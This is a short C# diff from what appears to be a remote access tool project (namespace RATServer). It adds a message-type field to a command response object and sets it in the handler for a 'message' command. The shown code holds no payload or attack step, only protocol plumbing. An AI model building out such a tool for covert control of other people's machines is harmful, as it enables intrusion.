@@ -82,6 +82,7 @@ namespace RATServer
                     {
                         case "message":
                             Functions.Message(c.Args[0]);
+                            r.Type = "Message"; 
                             r.Msg = "Message Success";
                             break;
                         default:
@@ -106,6 +107,7 @@ namespace RATServer
     [Serializable]
     public class Response
     {
+        public string Type { get; set; }
         public string Msg { get; set; }
         public byte[] Data { get; set; }
     }
